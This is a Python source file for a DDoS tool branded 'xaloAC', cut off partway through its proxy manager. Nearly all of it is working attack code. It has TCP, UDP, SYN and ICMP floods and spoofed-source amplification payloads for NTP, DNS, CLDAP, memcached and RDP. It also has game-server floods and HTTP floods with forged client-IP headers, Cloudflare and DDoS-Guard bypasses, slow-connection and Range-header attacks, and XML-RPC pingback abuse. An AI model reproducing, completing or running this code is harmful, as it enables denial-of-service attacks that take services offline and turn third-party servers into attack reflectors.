#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# xaloAC DDoS Tool - by x410m1s0

from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes, system, name as os_name
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP,
                    SOCK_DGRAM, IPPROTO_ICMP, SOCK_RAW, SOCK_STREAM, TCP_NODELAY,
                    gethostbyname, gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode
from colorama import Fore, Back, Style, init as colorama_init

colorama_init(autoreset=True)
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = getLogger("xaloAC")
logger.setLevel("INFO")

ctx = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2

__version__ = "1.0"
__dir__ = Path(__file__).parent
__ip__ = None

tor2webs = ['onion.city','onion.cab','onion.direct','onion.sh','onion.link','onion.ws',
            'onion.pet','onion.rip','onion.plus','onion.top','onion.si','onion.ly',
            'onion.my','onion.lu','onion.casa','onion.com.de','onion.foundation',
            'onion.rodeo','onion.lat','tor2web.org','tor2web.fi','tor2web.blutmagie.de',
            'tor2web.to','tor2web.io','tor2web.in','tor2web.it','tor2web.xyz',
            'tor2web.su','darknet.to','s1.tor-gateways.de','s2.tor-gateways.de',
            's3.tor-gateways.de','s4.tor-gateways.de','s5.tor-gateways.de']

try:
    with open(__dir__ / "config.json") as f:
        con = load(f)
except:
    con = {"MCBOT": "xaloAC", "MINECRAFT_DEFAULT_PROTOCOL": 47, "proxy-providers": []}

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]

MOR = Fore.MAGENTA
KOYU_MOR = Fore.LIGHTMAGENTA_EX
SIYAH = Fore.BLACK
BEYAZ = Fore.WHITE
KIRMIZI = Fore.RED
YESIL = Fore.GREEN
SARI = Fore.YELLOW
CYAN = Fore.CYAN
PARLAK = Style.BRIGHT
SIFIRLA = Style.RESET_ALL
BG_MOR = Back.MAGENTA
BG_KOYU_MOR = Back.LIGHTMAGENTA_EX

def temizle():
    system('cls' if os_name == 'nt' else 'clear')

def banner():
    temizle()
    print(f"""{KOYU_MOR}{PARLAK}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║     ██╗  ██╗ █████╗ ██╗      ██████╗  █████╗  ██████╗    ║
    ║     ╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██╔══██╗██╔════╝    ║
    ║      ╚███╔╝ ╚█████╔╝██║     ██║   ██║███████║██║         ║
    ║      ██╔██╗ ██╔══██╗██║     ██║   ██║██╔══██║██║         ║
    ║     ██╔╝ ██╗╚█████╔╝███████╗╚██████╔╝██║  ██║╚██████╗    ║
    ║     ╚═╝  ╚═╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ║
    ║                                                           ║
    ║              xaloAC DDoS TOOL v1.0                        ║
    ║              by x410m1s0                                  ║
    ╚═══════════════════════════════════════════════════════════╝
{SIFIRLA}""")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)

class Methods:
    LAYER7_METHODS = {"CFB","BYPASS","GET","POST","OVH","STRESS","DYN","SLOW","HEAD",
                      "NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","CFBUAM",
                      "APACHE","XMLRPC","BOT","BOMB","DOWNLOADER","KILLER","TOR","RHEX","STOMP"}
    LAYER4_AMP = {"MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"}
    LAYER4_METHODS = {*LAYER4_AMP,"TCP","UDP","SYN","VSE","MINECRAFT","MCBOT",
                      "CONNECTION","CPS","FIVEM","FIVEM-TOKEN","TS3","MCPE","ICMP","OVH-UDP"}
    ALL_METHODS = {*LAYER4_METHODS, *LAYER7_METHODS}

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)
    def __iadd__(self, value):
        self._value.value += value
        return self
    def __int__(self):
        return self._value.value
    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i, binary=False, precision=2):
        MULTIPLES = ["B","k{}B","M{}B","G{}B","T{}B","P{}B","E{}B","Z{}B","Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num, precision=2):
        suffixes = ['','k','m','g','t','p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return num

    @staticmethod
    def sizeOfRequest(res):
        size = len(res.request.method) + len(res.request.url)
        size += len('\r\n'.join(f'{k}: {v}' for k,v in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock, packet):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {"User-Agent":ua,"Accept":"text/html","Accept-Language":"en-US",
                    "Connection":"keep-alive","DNT":"1"}
            with s.get(url, headers=hdrs) as ss:
                for k,v in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(k,v))
            hdrs = {"User-Agent":ua,"Accept":"*/*","Referer":url}
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for k,v in ss.cookies.items():
                    if k == '__ddg2': idss = v
                    s.cookies.set_cookie(cookies.create_cookie(k,v))
            hdrs = {"User-Agent":ua,"Accept":"image/webp,*/*","Referer":url}
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for k,v in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(k,v))
                return s
        return False

    @staticmethod
    def safe_close(sock=None):
        if sock: sock.close()

class Minecraft:
    @staticmethod
    def varint(d):
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0: break
        return o

    @staticmethod
    def data(*payload):
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(i):
        return data_pack('>H', i)

    @staticmethod
    def long(i):
        return data_pack('>q', i)

    @staticmethod
    def handshake(target, version, state):
        return Minecraft.data(Minecraft.varint(0x00), Minecraft.varint(version),
                              Minecraft.data(target[0].encode()), Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target, version, state, ip, uuid):
        return Minecraft.data(Minecraft.varint(0x00), Minecraft.varint(version),
                              Minecraft.data(target[0].encode(), b"\x00", ip.encode(),
                              b"\x00", uuid.hex.encode()), Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol, username):
        if isinstance(username, str): username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00),
                              Minecraft.data(username))

    @staticmethod
    def chat(protocol, message):
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else 0x02 if protocol >= 389 else 0x01 if protocol >= 343 else 0x02 if protocol >= 336 else 0x03 if protocol >= 318 else 0x02 if protocol >= 107 else 0x01),
                              Minecraft.data(message.encode()))

class Layer4(Thread):
    def __init__(self, target, ref=None, method="TCP", synevent=None, proxies=None, protocolid=74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        self._proxies = list(proxies) if proxies else None
        self.SENT_FLOOD = self.TCP

    def run(self):
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self, ct=AF_INET, st=SOCK_STREAM, pt=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(ct, st, pt)
        else:
            s = socket(ct, st, pt)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, randbytes(1024)): continue
        Tools.safe_close(s)

    def UDP(self):
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target): continue
        Tools.safe_close(s)

    def SYN(self):
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._gen_syn(), self._target): continue
        Tools.safe_close(s)

    def ICMP(self):
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            p = self._gen_icmp()
            while Tools.sendto(s, p, (self._target[0], 0)): continue
        Tools.safe_close(s)

    def MINECRAFT(self):
        hs = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, hs): Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self):
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection() as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def CONNECTION(self):
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_conn, daemon=True).start()
            REQUESTS_SENT += 1

    def alive_conn(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            while s.recv(1): continue
        Tools.safe_close(s)

    def VSE(self):
        p = b'\xff\xff\xff\xffTSource Engine Query\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, p, self._target): continue

    def TS3(self):
        p = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, p, self._target): continue

    def MCPE(self):
        p = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, p, self._target): continue

    def FIVEM(self):
        p = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, p, self._target): continue

    def FIVEMTOKEN(self):
        token = str(uuid4())
        guid = str(randint(76561197960265728, 76561199999999999))
        p = f"token={token}&guid={guid}".encode()
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, p, self._target): continue

    def OVHUDP(self):
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for p in self._gen_ovhudp():
                    Tools.sendto(s, p, self._target)

    def MCBOT(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target, self.protocolid, 2,
                                                        ProxyTools.Random.rand_ipv4(), uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            Tools.send(s, Minecraft.login(self.protocolid, username))
            sleep(1.5)
            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)
        Tools.safe_close(s)

    def AMP(self):
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)): continue
        Tools.safe_close(s)

    def _gen_ovhudp(self):
        packets = []
        for _ in range(randint(2,4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])
            udp = UDP()
            udp.set_uh_sport(randint(1024,65535))
            udp.set_uh_dport(self._target[1])
            rnd = randbytes(randint(1024,2048)).decode("latin1","ignore")
            p = f"{randchoice(['PGET','POST','HEAD'])} {randchoice(['/','/null','/%00'])}{rnd} HTTP/1.1\nHost: {self._target[0]}:{self._target[1]}\r\n\r\n"
            udp.contains(Data(p.encode("latin1","ignore")))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _gen_syn(self):
        ip = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768,65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _gen_icmp(self):
        ip = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16,1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _gen_amp(self):
        payloads = []
        for ref in self._ref:
            ip = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)
            ud = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])
            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)
            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        elif name == "SYN": self.SENT_FLOOD = self.SYN
        elif name == "ICMP": self.SENT_FLOOD = self.ICMP
        elif name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        elif name == "CPS": self.SENT_FLOOD = self.CPS
        elif name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
        elif name == "VSE": self.SENT_FLOOD = self.VSE
        elif name == "TS3": self.SENT_FLOOD = self.TS3
        elif name == "MCPE": self.SENT_FLOOD = self.MCPE
        elif name == "FIVEM": self.SENT_FLOOD = self.FIVEM
        elif name == "FIVEM-TOKEN": self.SENT_FLOOD = self.FIVEMTOKEN
        elif name == "OVH-UDP": self.SENT_FLOOD = self.OVHUDP
        elif name == "MCBOT": self.SENT_FLOOD = self.MCBOT
        elif name == "RDP":
            self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "CLDAP":
            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "MEM":
            self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())
        elif name == "DNS":
            self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._gen_amp())

class HttpFlood(Thread):
    def __init__(self, thread_id, target, host, method="GET", rpc=1, synevent=None,
                 useragents=None, referers=None, proxies=None):
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        self._proxies = list(proxies) if proxies else None
        self._referers = list(referers) if referers else []
        self._useragents = list(useragents) if useragents else ["Mozilla/5.0"]
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/{randchoice(['1.0','1.1','1.2'])}\r\n"
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def run(self):
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self):
        spoof = ProxyTools.Random.rand_ipv4()
        return (f"X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f"X-Forwarded-For: {spoof}\r\n"
                f"Real-IP: {spoof}\r\n")

    @property
    def randHeadercontent(self):
        ua = randchoice(self._useragents) if self._useragents else "Mozilla/5.0"
        ref = randchoice(self._referers) if self._referers else "https://google.com"
        return (f"User-Agent: {ua}\r\n"
                f"Referrer: {ref}{parse.quote(self._target.human_repr())}\r\n" + self.SpoofIP)

    def generate_payload(self, other=None):
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") + "\r\n"))

    def open_connection(self, host=None):
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)
        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock, server_hostname=host[0] if host else self._target.host,
                                   server_side=False, do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @staticmethod
    def getMethodType(method):
        if method.upper() in {"CFB","CFBUAM","GET","TOR","COOKIE","OVH","EVEN","DYN","SLOW","PPS","APACHE","BOT","RHEX","STOMP"}:
            return "GET"
        elif method.upper() in {"POST","XMLRPC","STRESS"}:
            return "POST"
        elif method.upper() in {"GSB","HEAD"}:
            return "HEAD"
        return "REQUESTS"

    def GET(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def POST(self):
        payload = self.generate_payload(
            f"Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n{{\"data\": \"{ProxyTools.Random.rand_str(32)}\"}}")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def HEAD(self):
        self._req_type = "HEAD"
        self.GET()

    def NULL(self):
        payload = str.encode(self._payload +
                             f"Host: {self._target.authority}\r\n"
                             f"User-Agent: null\r\nReferrer: null\r\n" +
                             self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self):
        payload = self.generate_payload(
            f"Cookie: _ga=GA{ProxyTools.Random.rand_int(1000,99999)}; "
            f"{ProxyTools.Random.rand_str(6)}={ProxyTools.Random.rand_str(32)}\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self):
        payload = str.encode(self._defaultpayload + f"Host: {self._target.authority}\r\n\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def OVH(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self):
        payload = self.generate_payload(
            f"Content-Length: 524\r\nContent-Type: application/json\r\n\r\n"
            f"{{\"data\": \"{ProxyTools.Random.rand_str(512)}\"}}")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DYN(self):
        payload = str.encode(self._payload +
                             f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                             self.randHeadercontent + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def SLOW(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
            while Tools.send(s, payload) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode(f"X-a: {ProxyTools.Random.rand_int(1,5000)}\r\n")
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)

    def EVEN(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def GSB(self):
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode(
                    f"{self._req_type} {self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)} HTTP/1.1\r\n"
                    f"Host: {self._target.authority}\r\n" + self.randHeadercontent + "\r\n")
                Tools.send(s, payload)
        Tools.safe_close(s)

    def AVB(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = randchoice(self._proxies) if self._proxies else None
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                else:
                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = randchoice(self._proxies) if self._proxies else None
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                else:
                    with s.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
            else:
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)

    def APACHE(self):
        payload = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join(f"5-{i}" for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self):
        payload = self.generate_payload(
            f"Content-Length: 345\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/xml\r\n\r\n"
            f"<?xml version='1.0' encoding='iso-8859-1'?>"
            f"<methodCall><methodName>pingback.ping</methodName>"
            f"<params><param><value><string>{ProxyTools.Random.rand_str(64)}</string></value></param>"
            f"<param><value><string>{ProxyTools.Random.rand_str(64)}</string></value></param></params></methodCall>")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def KILLER(self):
        while True:
            Thread(target=self.GET, daemon=True).start()

    def TOR(self):
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload = str.encode(self._payload + f"Host: {target}\r\n" + self.randHeadercontent + "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode(
            f"{self._req_type} {self._target.authority}/{randhex} HTTP/1.1\r\n"
            f"Host: {self._target.authority}/{randhex}\r\n" + self.randHeadercontent + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, 'This method requires proxies'
        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break
        res = run([str(Path.home() / "go/bin/bombardier"),
                   f'--connections={self._rpc}', '--http2', '--method=GET',
                   '--latencies', '--timeout=30s', f'--requests={self._rpc}',
                   f'--proxy={proxy}', f'{self._target.human_repr()}'], stdout=PIPE)
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def select(self, name):
        self.SENT_FLOOD = self.GET
        metodlar = {"POST": self.POST, "HEAD": self.HEAD, "NULL": self.NULL,
                    "COOKIE": self.COOKIES, "PPS": self.PPS, "OVH": self.OVH,
                    "STRESS": self.STRESS, "DYN": self.DYN, "SLOW": self.SLOW,
                    "EVEN": self.EVEN, "GSB": self.GSB, "AVB": self.AVB,
                    "CFB": self.CFB, "CFBUAM": self.CFBUAM, "BYPASS": self.BYPASS,
                    "DGB": self.DGB, "APACHE": self.APACHE, "XMLRPC": self.XMLRPC,
                    "BOT": self.BOT, "DOWNLOADER": self.DOWNLOADER, "KILLER": self.KILLER,
                    "TOR": self.TOR, "RHEX": self.RHEX, "STOMP": self.STOMP,
                    "BOMB": self.BOMB}
        if name in metodlar:
            self.SENT_FLOOD = metodlar[name]

class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, pt):
        providers = [p for p in cf["proxy-providers"] if p["type"] == pt or pt == 0]
        proxes = set()
